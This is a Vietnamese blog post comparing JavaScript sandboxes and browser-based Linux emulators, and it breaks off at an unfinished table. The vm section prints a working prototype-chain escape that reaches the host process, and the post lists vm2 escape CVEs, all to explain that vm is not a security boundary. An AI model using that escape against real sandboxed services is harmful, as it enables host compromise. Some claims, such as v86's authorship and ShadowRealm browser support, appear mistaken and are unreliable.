---
title: So sánh các giải pháp JavaScript mô phỏng nhân Linux
description: Phân tích chuyên sâu các bản tái tạo môi trường Linux
  bằng JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEoFS9I15CAZojXYc6NMqggEYGct9o9b3JnWdXWOtlzgs2lclmqw8adtWgXUeeBMRHvm5LoajQ+OcImaAyA8jwYA=="
author_sig: "7bOlt3GZ1eWA8W31ZgY/mhlwoYnQUgzCdtEHmXzszTxm80lqy6g3xq7FztEH1tFtqA+DF4ueKeC5dBaGA2d6dQ=="
---

# Mọi sandbox JavaScript, trình giả lập, trình mô phỏng và honeypot Linux -- so sánh

Được rồi, đã lâu rồi tôi lún quá sâu vào hang thỏ này. Mọi chuyện bắt đầu vì tôi đang giúp [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- dự án của Fortune (tôi sẽ quay lại sau) -- và người ta cứ hỏi tôi "khoan, khác gì với `v86`?" hay "sao không dùng `vm2`?" -- và tôi nhận ra mình không thể trả lời rõ ràng nếu chưa vẽ bản đồ toàn bộ hệ sinh thái trước. Nên đây, chắc là tới lúc rồi.

Hóa ra có bốn họ riêng biệt -- sandbox JS, trình giả lập Linux, trình mô phỏng Linux, và honeypot -- và chúng hầu như không bao giờ trùng nhau, dù người ta cứ nhắc chúng trong cùng một câu. Ai xây hệ thống plugin dùng `isolated-vm`. Ai làm demo công cụ CLI dùng `v86`. Ai làm tình báo mối đe dọa SSH dùng Cowrie. Chúng giải các bài toán hoàn toàn khác nhau dưới cùng chiếc ô mơ hồ "chạy mã trong một cái hộp."

Tôi đã dành nhiều thời gian đọc mã nguồn, báo cáo CVE, tài liệu kiến trúc và trang npm để viết bài này. Sẽ dài đấy -- pha cà phê đi, nghiêm túc đấy. Hay hai ly.

> Tuyên bố nhỏ : `typescript-virtual-container` được giới thiệu trong bài này vì đó là thứ châm ngòi cho nghiên cứu. Tôi đã cố công bằng với phần còn lại, nhưng hãy nhớ bối cảnh đó.

---

## Phần 0 -- Trước hết, bạn thực sự đang giải bài toán nào?

Trước khi lặn sâu, đáng làm rõ mỗi họ dùng để làm gì, vì thuật ngữ nhanh chóng rối tung và mọi người cứ trộn lẫn (kể cả tôi, trước khi tôi ngồi xuống và vẽ bản đồ đàng hoàng).

**Sandbox JS** cách ly mã JavaScript khỏi tiến trình Node.js chủ. Mô hình đe dọa là : mã JS không đáng tin có thể gọi `process.exit()`, đọc tệp, hay sinh tiến trình con. Giải pháp là ranh giới quanh thực thi V8. Các công cụ này không có khái niệm shell Linux, hệ thống tệp có quyền, hay SSH.

**Trình giả lập Linux** chạy nhân Linux thật không sửa đổi trong trình giả lập CPU (x86, RISC-V, OR1K) viết bằng JavaScript hay WebAssembly. Bạn khởi động OS thật. Bạn có syscall thật. Bạn có tương thích nhị phân với chương trình biên dịch cho x86. Giá tài nguyên khổng lồ.

**Trình mô phỏng Linux** bắt chước *hành vi* của hệ thống Linux mà không chạy nhân thật. Chúng triển khai trình thông dịch shell, hệ thống tệp ảo, và vừa đủ ngữ nghĩa Unix để đánh lừa chương trình và con người. Không nhân, không Wasm, không giả lập CPU. Ít tài nguyên hơn nhiều.

**Honeypot** thiết kế để thu hút kẻ tấn công và ghi lại việc chúng làm. Chúng không chủ yếu là môi trường thực thi -- mà là công cụ quan sát. Độ trung thực với hành vi Linux thật chỉ quan trọng ở mức ngăn kẻ tấn công phát hiện bẫy.

Với khung đó, đây là vị trí mỗi dự án trong bài :

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Trình giả lập Linux :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Trình mô phỏng Linux : typescript-virtual-container (duy nhất trong khoảng này)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (không phải bộ cách ly, nhưng liên quan)
```

---

## Phần 1 -- Sandbox JavaScript

### 1.1 `vm` -- module gốc của Node.js (không như bạn nghĩ)

Câu trả lời lâu đời nhất cho "chạy JS không đáng tin" trong Node là module gốc `vm`. Nó có từ v0.1, nên nhiều người dùng nó đầu tiên -- và bị bỏng.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Điều `vm` thực sự làm : tạo ngữ cảnh V8 mới (bộ constructor gốc mới -- `Object`, `Array`, `Function`, v.v.) và chạy mã trong đó, với tham chiếu chia sẻ tới những gì bạn đặt trong `sandbox`. Động cơ V8 của bạn không đổi. Tiến trình của bạn không đổi. Bộ nhớ chia sẻ.

Lý do `vm` không mang lại bảo mật : chuỗi prototype của JavaScript là DAG nối mọi thứ tới `Object.prototype`. Nếu bạn đặt object của thế giới chủ vào sandbox, khách có thể leo chuỗi prototype lên tới constructor chủ. Từ `Function`, bạn có thể gọi `Function("return process")()` và lấy `process` thật. Game over. Như kiểu, ngay lập tức.

```js
// Việc này chạy ngon lành trong vm -- bạn lấy process thật
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Ý tôi là, chính tài liệu Node.js đã nói : "Module vm không phải cơ chế bảo mật. Đừng dùng nó để chạy mã không đáng tin." Cảnh báo này tồn tại từ lâu. Mọi người cứ phớt lờ. Tôi từng thấy ứng dụng production dùng `vm` làm sandbox. Làm ơn, đừng làm vậy.

**Kết luận** : cơ chế phạm vi, không phải sandbox. Dùng khi cần cách ly biến (động cơ template, tính năng kiểu `eval` nơi bạn kiểm soát mã). Không bao giờ cho đầu vào không đáng tin.

**Bộ nhớ** : chi phí không đáng kể -- cùng heap V8 với tiến trình chủ.
**Bảo mật** : không có trước kẻ tấn công có động lực.

---

### 1.2 `vm2` -- nỗ lực của cộng đồng, và cái chết rất dài của nó

`vm2` là câu trả lời của cộng đồng cho vấn đề thoát `vm`. Ý tưởng cốt lõi : bọc mỗi object vượt ranh giới sandbox trong `Proxy` chặn truy cập thuộc tính, chặn leo prototype, và lọc tham chiếu nguy hiểm. Ý tưởng thông minh về lý thuyết! Thực tế hóa ra kém thuyết phục hơn nhiều, như ta sẽ thấy.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // ném VMError, process không chạm tới được
```

Vài năm đầu, việc đó chạy khá ổn. Nhưng bề mặt tấn công của `Proxy` JavaScript khổng lồ. Mỗi tính năng ngôn ngữ JS mới -- generator, async iterator, `Symbol.toPrimitive`, `Error.prepareStackTrace`, slot nội bộ `Promise` -- là một vector vượt ngục tiềm năng.

Dòng thời gian CVE thì... kiểu thế này. Nhìn này :

| Ngày | CVE | Cơ chế |
|------|-----|-----------|
| Th10 2022 | CVE-2022-36067 | Thoát ngữ cảnh chủ qua `Error.prepareStackTrace` |
| Th4 2023 | CVE-2023-29017 | Rò rỉ object chủ qua lỗi async không xử lý |
| Th4 2023 | CVE-2023-29199 | Vượt làm sạch ngoại lệ qua `handleException()` |
| Th4 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Th5 2023 | CVE-2023-32314 | `Proxy` trên `Error.name` → `Function` → RCE |
| Th7 2023 | CVE-2023-37466 | Hàm async + tràn ngăn xếp + `Proxy.getPrototypeOf` |
| Th7 2023 | CVE-2023-37903 | Luồng worker + thoát bằng eval |

Ba CVE nghiêm trọng cùng một tháng (tháng 4 năm 2023). BA. TRONG MỘT THÁNG. Sau CVE-2023-37903, maintainer chính thức ngừng hỗ trợ thư viện với thông điệp : *"Thư viện chứa vấn đề bảo mật nghiêm trọng và không nên dùng trong production."*

Maintainer hồi sinh nó tháng 10 năm 2025 với phiên bản 3.10.0, tuyên bố đã sửa mọi thứ đã biết thời đó. Một vụ thoát nghiêm trọng mới (CVE-2026-22709, CVSS 9.8) bị tiết lộ tháng 1 năm 2026, tiếp theo là loạt mười một vụ nữa tháng 5 năm 2026. Mười một. Mô hình không đổi và thật lòng tôi không nghĩ nó sẽ đổi.

Vấn đề nền tảng mang tính kiến trúc -- và đó là bài học toàn hệ sinh thái mất một lúc mới học được. Bạn không thể xây sandbox an toàn bằng cùng ngôn ngữ bạn đang cách ly, trên cùng động cơ, trong cùng tiến trình. Bề mặt thoát chính là toàn bộ triển khai V8 -- mà V8 là vài triệu dòng C++ thay đổi liên tục. Mỗi tính năng JS mới có thể mở đường tấn công mới.

**Kết luận** : Đừng dùng cho ứng dụng nhạy bảo mật. Ngay cả bản mới nhất, các cách vượt mới vẫn bị phát hiện vài tháng một lần. Chính maintainer cũng công khai thừa nhận.

---

### 1.3 `isolated-vm` -- cái thực sự hoạt động

`isolated-vm` đi đường đúng : dùng nguyên thủy cách ly gốc của V8, Isolate. Mỗi Isolate V8 có heap riêng, bộ thu gom rác riêng, bộ native riêng, và không tham chiếu chia sẻ nào với Isolate khác.

Đó là cùng ranh giới Chrome dùng giữa các tab. Đó là rào cản bảo mật thật, không phải mẹo ngôn ngữ dựng trên Proxy.

```js
import ivm from "isolated-vm";

// Mỗi isolate là heap V8 riêng
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // giới hạn tính bằng MB
const context = await isolate.createContext();
const jail = context.global;

// Truyền dữ liệu qua ranh giới cần tuần tự hóa rõ ràng
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Không thể chạm tới tiến trình chủ, heap chủ hay module chủ
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Bạn có thể kết liễu dứt khoát khi timeout hay quá bộ nhớ
isolate.dispose(); // giải phóng toàn bộ heap
```

Các kiểu `Reference` và `ExternalCopy` là cầu giao tiếp rõ ràng. `Reference` cho isolate một handle có thể gọi tới hàm chủ -- isolate có thể gọi nhưng không thể soi closure hay prototype của nó. `ExternalCopy` tuần tự hóa một giá trị (clone có cấu trúc) qua ranh giới heap. Mô hình cầu rõ ràng này không tiện, nhưng đó là thứ khiến cách ly thành thật.

Bạn có thể đặt giới hạn tài nguyên chặt : bộ nhớ (isolate bị kết liễu nếu vượt), timeout tường đồng hồ, và timeout CPU. Kết liễu là thật -- nó giết toàn bộ Isolate V8, không phải timeout JS kiểu có thể lách bằng `while(true)`.

**Giới hạn** : chỉ JS. Bạn không thể chạy bash trong đó. Không có khái niệm tệp, quyền, mạng hay tiến trình. Đó chính xác là công cụ đúng cho JS do người dùng gửi (plugin, công thức, hook script), và công cụ sai cho mọi thứ còn lại. Tác giả `typescript-virtual-container` từng nhắc cô ấy đã cân nhắc nó lúc đầu trước khi nhận ra "chạy lệnh shell" và "cách ly JavaScript" là hai bài toán khác nhau về nền tảng.

**Bộ nhớ** : ~3-10 Mo cho mỗi isolate trống, tăng theo mức dùng heap.
**Bảo mật** : vững. Ranh giới V8 Isolate là nguyên thủy cách ly thật.
**npm** : [isolated-vm](https://www.npmjs.com/package/isolated-vm)
**GitHub** : [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- động cơ JS riêng biên dịch sang Wasm

Cách tiếp cận khác : thay vì cách ly trong V8, chạy một động cơ JavaScript hoàn toàn riêng biên dịch sang WebAssembly. Chủ chạy trong V8/Node. Khách chạy trong QuickJS-trong-Wasm. Ranh giới sandbox Wasm cung cấp cách ly.

QuickJS vẫn là tác phẩm của Fabrice Bellard (cùng người đằng sau QEMU, FFmpeg, JSLinux, TinyEMU -- con người này không có thật, nghiêm túc đấy, sao một người làm được ngần ấy thứ?). Đó là động cơ JS nhỏ tuân ES2023 viết bằng C, và biên dịch sang Wasm chỉ khoảng 500 Ko.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Chạy trong QuickJS, tách hoàn toàn khỏi V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS là động cơ JavaScript nhỏ tuân ES2023 viết bằng C. Biên dịch sang Wasm, nó khoảng 500 Ko cho biến thể đồng bộ, ~1 Mo cho biến thể bất đồng bộ (Asyncify). Quản lý bộ nhớ thủ công -- mỗi giá trị bạn trích từ VM phải giải phóng rõ ràng, hơi phiền nhưng ngăn bất ngờ GC xuyên ranh giới. Một thỏa hiệp vui vẻ!

Wrapper `@sebastianwessel/quickjs` thêm API thân thiện hơn phía trên, với hệ thống tệp ảo tùy chọn, hỗ trợ fetch, và stub các module Node.js :

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Mô hình bảo mật khác `isolated-vm` : mô hình bộ nhớ tuyến tính của Wasm khiến khách không thể chạm trực tiếp object heap V8. Bề mặt tấn công là interface chủ↔Wasm (import/export), không phải toàn bộ ngôn ngữ JS. Nhìn chung điều này được coi là vững hơn sandbox dựa trên Proxy.

Mặt trái : QuickJS không tối ưu bằng V8. Với tải nặng CPU bằng JS, nó chậm hơn V8 5 đến 20 lần. Với mẩu mã nhỏ và đánh giá không đáng tin, thường không quan trọng.

**Bộ nhớ** : ~500 Ko module Wasm + heap cho mỗi instance.
**Bảo mật** : ranh giới Wasm, coi là vững hơn cách tiếp cận dựa Proxy.
**npm** : [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)
**GitHub** : [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- runtime đặt quyền lên trước

Deno theo triết lý hoàn toàn khác : thay vì sandbox trong Node, xây runtime mới an toàn theo mặc định. Tôi thực sự thích cách này -- đó là điều Node.js lẽ ra phải là ngay từ đầu, thật lòng mà nói. Ryan Dahl (cha đẻ gốc của Node.js) đã tạo ra Deno đúng vì ông hối tiếc vài quyết định thiết kế của Node.js, nghĩ mà xem điên rồ thế nào.

Mỗi năng lực nhạy cảm (đọc tệp, ghi tệp, mạng, môi trường, tiến trình con) đòi cờ `--allow-*` rõ ràng :

```bash
# Cái này chỉ được đọc trong /data, không gì khác
deno run --allow-read=/data script.ts

# Cái này chỉ được chạm một tên miền duy nhất
deno run --allow-net=api.example.com script.ts

# Không cờ = không quyền
deno run untrusted.ts # không đọc, ghi, mạng, sinh gì được
```

Mô hình quyền triển khai ở tầng Rust/OS -- không phải mẹo JS. Khi mã Deno gọi `Deno.readFile()`, nó đi qua thao tác Rust kiểm tra bảng quyền trước khi chạm hệ thống tệp. Bạn không thể lách từ JS vì syscall không bao giờ xảy ra nếu quyền không được cấp.

Để chạy mã thực sự không đáng tin, Deno Workers (Web Workers) cung cấp isolate thứ hai trong cùng tiến trình, mỗi cái một bộ quyền riêng. Bạn có thể sinh worker không quyền nào và giao tiếp với nó qua `postMessage`.

Deno 2 (ra tháng 10 năm 2024) thêm tương thích npm đầy đủ và shim tương thích Node.js, cải thiện đáng kể độ tiếp nhận cho ca dùng phía máy chủ.

**Thỏa hiệp** : mô hình bảo mật của Deno xuất sắc cho mã bạn có thể tin một phần. Với mã hoàn toàn không đáng tin có thể mang tính đối kháng, mô hình quyền không giúp -- bạn cần ranh giới Isolate (`isolated-vm`) hay động cơ khác (`quickjs-emscripten`), vì Deno vẫn dùng V8 và kẻ tấn công tinh vi có thể tìm lỗi tầng V8.

---

### 1.6 TC39 ShadowRealm -- câu trả lời chuẩn hóa (một ngày nào đó)

Cơ quan chuẩn hóa JavaScript (TC39) có đề xuất ShadowRealm cố chuẩn hóa điều `vm` và `vm2` từng thử, nhưng với mô hình bảo mật đúng. ShadowRealm tạo ngữ cảnh thực thi JS cách ly với intrinsic riêng, không truy cập vương quốc ngoài, và interface import/export kiểm soát chặt.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Intrinsic tách biệt, không truy cập vương quốc ngoài
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm có trong trình duyệt (Chrome 90+, Firefox 105+) nhưng chưa vào Node.js ổn định năm 2026. Đề xuất TC39 Compartments xây tiếp lên nó cho cách ly tầng module. Đó là các câu trả lời chuẩn hóa dài hạn, nhưng chưa sẵn sàng cho production phía máy chủ Node. Kiểu công trường bạn thấy từ xa mà... chỉ là chưa tới. Đúng chất TC39 cổ điển.

---

### Tóm tắt họ sandbox

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Ranh giới cách ly** | không có (phạm vi) | Proxy (vỡ) | V8 Isolate | Wasm | V8 Isolate + quyền Rust |
| **Giới hạn bộ nhớ** | ❌ | ❌ | ✅ giới hạn chặt | ✅ heap Wasm | một phần |
| **Timeout CPU** | ❌ | ✅ (lách được) | ✅ chặt | ✅ | ✅ |
| **Bảo mật** | không có | vỡ | vững | vững | vững |
| **Tốc độ JS** | V8 gốc | V8 gốc | V8 gốc | chậm hơn ~10 lần | V8 gốc |
| **Trình duyệt** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Tương thích Node** | gốc | ✅ | ✅ | shim một phần | một phần |
| **Trạng thái** | ổn định | rủi ro (CVE mới) | ✅ hoạt động | ✅ hoạt động | ✅ hoạt động |
| **Chi phí RAM** | ~1 Mo | ~5-20 Mo | ~3-10 Mo | ~5-15 Mo | ~10-30 Mo |

Kết luận : nếu bảo mật quan trọng, có đúng hai lựa chọn thật -- `isolated-vm` (extension gốc, V8 Isolate, tốc độ JS đầy đủ) và `quickjs-emscripten` (Wasm, tương thích trình duyệt, chậm hơn ~10 lần cho tính toán nặng). Phần còn lại hoặc là "làm ơn đừng làm vậy" (`vm`, `vm2`) hoặc là runtime giải bài toán hoàn toàn khác (Deno). ShadowRealm một ngày nào đó có thể thay đổi cuộc chơi, nhưng chưa phải lúc này.

---

## Phần 2 -- Trình giả lập Linux bằng JavaScript

Đây là lúc mọi thứ thực sự thú vị với tôi. Đây là trình giả lập *thật* -- chúng triển khai tập lệnh CPU bằng JavaScript hay WebAssembly, khởi động ảnh nhân Linux thật, và chạy nhị phân userspace thật. Cách ly tới từ việc khách và chủ không chia sẻ gì : không gian bộ nhớ khác nhau, luồng lệnh khác nhau.

Cái giá khổng lồ, nhưng thứ bạn nhận lại đáng kinh ngạc : Linux thật, chạy thật, trong trình duyệt hay tiến trình Node của bạn. Kiểu, nghĩ mà xem điên rồ thế nào, đúng không?

### 2.1 `v86` -- trình giả lập PC x86 bằng JS + JIT Wasm

`v86` của Fabrice (copy trên GitHub) là trình giả lập x86 open-source có năng lực nhất bằng JavaScript. Nó khởi đầu là trình thông dịch JS thuần khoảng 2013 và tiến hóa thành hệ thống JIT nơi khối cơ bản x86 được dịch sang WebAssembly tức thì, cải thiện hiệu năng đáng kể.

Những gì nó giả lập :
- **CPU** : x86-32 (IA-32), tập lệnh cỡ Pentium 1. 64-bit (x86-64) vẫn loại trừ -- đó là giới hạn kiến trúc phần cứng, không phải tính năng thiếu.
- **FPU** : qua `Float64Array` của JavaScript. x87 dùng độ chính xác mở rộng 80-bit ; double JS là 64-bit. Nghĩa là kết quả dấu chấm động có thể lệch nhẹ so với CPU thật.
- **Bộ nhớ** : cấu hình được, ánh xạ tới `SharedArrayBuffer` hay `ArrayBuffer` trong heap JS.
- **Phần cứng** : 8254 PIT (timer), 8259 PIC (điều khiển ngắt), điều khiển bàn phím 8042 (PS/2), CMOS RTC, VGA với mở rộng SVGA và Bochs VBE, điều khiển IDE, điều khiển đĩa mềm (8272A), card mạng NE2000.
- **BIOS** : dùng SeaBIOS (BIOS x86 open-source).

JIT hoạt động bằng cách nhận diện khối cơ bản (chuỗi lệnh x86 không nhảy), dịch chúng thành hàm WebAssembly, cache hàm đó, và gọi nó ở các lần thực thi sau của cùng khối. Đường mã nóng đạt hiệu năng Wasm gốc. Đường lạnh rớt về trình thông dịch JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 Mo
  autostart: true,
});

// Bắt đầu ra serial (console nhân Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Gửi đầu vào cho khách (gõ trong shell)
emulator.serial0_send("ls /\n");
```

**OS hỗ trợ** : Alpine Linux (xuất sắc), Ubuntu 16.04/18.04 (chỉ i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (có dè dặt), MS-DOS.

**Thời gian khởi động** : 15-40 giây cho Alpine Linux từ ảnh sạch. Đó là bản chất của khởi tạo nhân thật -- bạn không thể bỏ qua. Đúng, người dùng của bạn sẽ nhìn nhân Linux khởi động trong trình duyệt của họ. Đó là thỏa thuận.

**Bộ nhớ tối thiểu** : 100-256 Mo cho mỗi instance. Riêng cache mã Wasm JIT có thể tới hàng chục Mo cho instance Linux bận.

**Dùng trong Node.js** : hỗ trợ đầy đủ. DOM vẫn thừa -- đầu ra VGA có thể bỏ qua nếu bạn chỉ quan tâm đầu ra serial.

**Điều bạn không thể làm** : chạy nhị phân 64-bit, dùng tính năng nhân hiện đại (eBPF, io_uring, v.v.), hay chạy hơn vài instance đồng thời mà không chạm giới hạn bộ nhớ.

**npm** : [v86](https://www.npmjs.com/package/v86) -- cập nhật liên tục, bản phát hành mới nhất đúng ngày tôi viết.
**GitHub** : [copy/v86](https://github.com/copy/v86)
**Demo** : [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux và TinyEMU -- công trình của Bellard, hai lần

JSLinux là trình giả lập Linux bằng JavaScript của chính Fabrice Bellard -- cái đầu tiên, phát hành 2011. Tôi cứ nhắc Bellard trong bài này vì ông ấy cứ xuất hiện : QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Con người này đúng là khác biệt. Thực sự là một trong những đóng góp kỹ thuật cá nhân ấn tượng nhất lịch sử phần mềm, không ngoa.

JSLinux gốc là trình thông dịch x86 JS thuần. Năm 2016, Bellard viết TinyEMU (trình giả lập RISC-V bằng C), biên dịch nó sang JavaScript qua Emscripten, và nó thành nền của JSLinux hiện tại. Nên JSLinux hiện tại thực chất là mã C sinh ra JavaScript -- không phải JS viết tay chút nào.

Ghi chú kỹ thuật trên trang của Bellard đáng đọc : JSLinux hiện tại chạy CPU RISC-V 32 hay 64-bit (không phải x86), giả lập console VirtIO, mạng VirtIO, thiết bị khối VirtIO, và hệ thống tệp 9P để chia sẻ tệp với chủ. Demo JS biên dịch từ C bằng Emscripten -- không phải JS viết tay.

Bản thân TinyEMU hỗ trợ :
- RISC-V RV32IMAFDQC và RV64IMAFDQC (32 và 64-bit, với dấu chấm động, nhân, lệnh nén)
- x86 qua KVM (chỉ gốc, không giả lập -- nên bản JS chỉ RISC-V)
- Console VirtIO, mạng, khối, đầu vào, hệ thống tệp 9P

TinyEMU có demo JavaScript cung cấp qua Emscripten. Đó là nền của JSLinux và cũng được `container2wasm` dùng (xem mục 2.5).

**Trạng thái JSLinux** : không gói npm, không API lập trình được. Đó là demo bạn mở trong trình duyệt. Ý nghĩa lịch sử lớn -- nó chứng minh khái niệm. Giá trị thực tế làm thư viện : không.

**TinyEMU** : không trên npm, mã C có trên [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k -- trình giả lập OR1K

jor1k là trình giả lập OpenRISC 1000 (OR1K) viết bằng JavaScript bởi Sebastian Macke. Nó thú vị về lịch sử vì jor1k giới thiệu hỗ trợ hệ thống tệp VirtIO 9P, mà Bellard sau đó đưa vào TinyEMU và JSLinux. Thụ phấn chéo giữa các dự án này rất chặt -- chúng vay mượn ý tưởng lẫn nhau, điều này thật lòng là một trong những thứ hay nhất của công trình giả lập open-source.

**Trạng thái** : không còn duy trì tích cực, không gói npm. Tới nay đã lưu trữ. Hữu ích để biết chủ yếu cho bối cảnh lịch sử -- kiểu nếu ai nhắc jor1k trong trò chuyện, giờ bạn biết đó là gì :)

---

### 2.4 CheerpX -- trình giả lập x86 thương mại cho trình duyệt

CheerpX của Leaning Technologies là trình giả lập Linux x86 thương mại chất lượng production. Nó không open-source, nhưng có năng lực hơn hẳn v86 trong việc chạy userspace Debian/Ubuntu thật. Nếu bạn cần VSCode thật trong trình duyệt, đây là thứ bạn cần.

Khác biệt chính với v86 :
- Hỗ trợ ISA rộng hơn (nhiều mở rộng x86 hơn, tương thích glibc tốt hơn)
- Hệ thống tệp dựa trên IndexedDB trong trình duyệt (bền vững qua tải lại trang)
- Hỗ trợ pthread qua `SharedArrayBuffer` (đòi header COOP/COEP -- đúng, các header bảo mật phiền phức đó)
- Thiết kế để chạy VSCode, Python, Node.js, và ứng dụng thật khác -- không chỉ ảnh OS tối thiểu
- Hỗ trợ chuyên nghiệp và SLA có sẵn (tức bạn có thể mắng ai đó nếu nó hỏng)

Ca dùng điển hình là "chạy ứng dụng Linux thật trong trình duyệt không cần máy chủ." Các công ty dùng nó cho IDE trên trình duyệt, hướng dẫn lập trình, và tài liệu tương tác.

```js
// API CheerpX (rút gọn)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Chuyện với Node.js** : CheerpX thiết kế trước hết cho trình duyệt. Trình giả lập bên dưới về lý thuyết có thể chạy trong Node (nó là Wasm), nhưng API và tài liệu hoàn toàn hướng dùng trình duyệt. Dùng phía máy chủ không được hỗ trợ.

**Bộ nhớ** : tương tự v86 -- 200+ Mo cho instance Debian thật.
**Giá** : miễn phí cho dự án open-source, giấy phép thương mại cho SaaS production.
**Tài liệu** : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Node.js trong Wasm, không phải giả lập Linux

WebContainers thường bị xếp chung với trình giả lập Linux nhưng khác về kiến trúc. Chúng không giả lập x86. Chúng không khởi động Linux. Chúng chạy Node.js biên dịch sang WebAssembly dùng WASI. Khác biệt này rất quan trọng và tôi đã phí quá nhiều thời gian bối rối về nó.

Tôi nghĩ nhầm lẫn tới từ marketing -- "chạy Node.js trong trình duyệt của bạn" nghe như giả lập, nhưng thực chất là chính Node.js biên dịch sang Wasm, không phải giả lập Linux chạy Node.js trong VM. Hai kiến trúc hoàn toàn khác.

Kiến trúc :
1. Node.js được biên dịch sang Wasm (runtime WASI tùy chỉnh riêng)
2. Service Worker chặn yêu cầu mạng của máy chủ Node.js giả lập và định tuyến chúng về tab trình duyệt
3. Hệ thống tệp sống trong bộ nhớ trình duyệt (không I/O đĩa)
4. npm là triển khai tùy chỉnh tối ưu cho dùng trong trình duyệt

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Ghi tệp
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Chạy lệnh Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Vì nó chạy Node.js thật (biên dịch sang Wasm), bạn có npm thật, API Node.js thật, và phân giải module thật. Bạn không có userspace Linux tổng quát -- bạn không thể cài gói hệ thống bằng `apt`, chạy nhị phân biên dịch tùy ý, hay làm nhiều ngoài hệ sinh thái Node.js.

**Điều kiện trình duyệt** : SharedArrayBuffer (đòi header COOP/COEP), hỗ trợ Service Worker, Wasm hiện đại.

**Chuyện với Node.js** : thiết kế riêng cho dùng trình duyệt. API không chạy ngoài ngữ cảnh trình duyệt.

**npm** : [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)
**Tài liệu** : [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- container Docker biên dịch thành Wasm

`container2wasm` là công cụ (không phải gói npm) của NTT lấy ảnh container Docker và biến nó thành nhị phân WebAssembly chạy được trong bất kỳ chủ Wasm nào -- kể cả trình duyệt. Lần đầu thấy, tôi thực sự không tin nó chạy được.

Cơ chế :
- Với container x86_64 : nhúng Bochs (trình giả lập x86, biên dịch sang Wasm) + hệ thống tệp gốc của container
- Với container riscv64 : nhúng TinyEMU (lại Bellard!) + hệ thống tệp gốc của container
- Tệp `.wasm` kết quả khởi động trình giả lập, gắn hệ thống tệp container, và thực thi điểm vào của container

```bash
# Biến container Ubuntu 22.04 thành Wasm
c2w ubuntu:22.04 out.wasm

# Chạy nó
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Hay phục vụ nó cho dùng trình duyệt
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

`.wasm` kết quả cồng kềnh -- Ubuntu tối thiểu vài trăm Mo -- nhưng hoàn toàn tự chứa. Bạn có thể gửi email `.wasm` cho ai đó và họ có thể chạy Ubuntu trong trình duyệt. Câu này lẽ ra vô nghĩa mà ta đã tới đây rồi.

**GitHub** : [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Tóm tắt họ trình giả lập

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
